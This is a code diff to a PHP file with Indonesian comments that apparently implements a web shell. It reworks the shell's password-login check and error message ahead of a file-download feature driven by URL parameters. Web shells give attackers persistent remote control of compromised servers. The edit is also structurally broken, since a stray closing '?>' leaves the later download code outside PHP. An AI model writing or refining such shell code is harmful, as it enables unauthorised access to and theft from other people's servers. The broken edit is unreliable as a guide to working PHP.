@@ -151,13 +151,25 @@ function login_shell() {
 
 // Proses autentikasi
 if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
-    if (isset($_POST['password']) && password_verify($_POST['password'], $password_hash)) {
-        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
+    if (isset($_POST['password'])) {
+        // Verifikasi password menggunakan password_verify()
+        if (password_verify($_POST['password'], $password_hash)) {
+            // Jika password benar, set session
+            $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
+        } else {
+            // Jika salah, tampilkan halaman login
+            echo "<script>alert('Password salah!');</script>";
+            login_shell();
+        }
     } else {
+        // Jika belum login, tampilkan halaman login
         login_shell();
     }
 }
 
+// Setelah login berhasil, halaman utama dapat diakses
+echo "Selamat datang! Anda telah login.";
+?>
 // Fitur download file (opsional)
 if (isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
     @ob_clean();
